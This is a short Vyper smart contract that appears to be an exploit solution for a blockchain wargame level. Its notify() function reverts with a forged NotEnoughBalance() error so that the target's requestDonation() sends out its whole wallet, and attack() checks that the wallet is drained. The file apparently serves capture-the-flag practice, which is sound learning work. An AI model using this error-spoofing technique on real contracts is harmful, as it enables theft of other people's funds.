# @version ^0.3.7

interface InstanceInterface:
    def requestDonation() -> bool: nonpayable
    def wallet() -> address: view
    def coin() -> address: view

interface ICoin:
    def balances(owner: address) -> uint256: view

owner: immutable(address)

instance: InstanceInterface
coin: ICoin

@external
@payable
def __init__(_instance: InstanceInterface):
    owner = msg.sender
    self.instance = _instance
    self.coin = ICoin(self.instance.coin())

@external
@view
def get_coin_balance(addr: address) -> uint256:
    return self.coin.balances(addr)

@external
def attack():
    assert msg.sender == owner, "!owner"
    self.instance.requestDonation()
    assert self.coin.balances(self.instance.wallet()) == 0, "wallet !drained"

@external
def notify(amount: uint256):
    if amount <= 10:
        raw_revert(method_id("NotEnoughBalance()"))
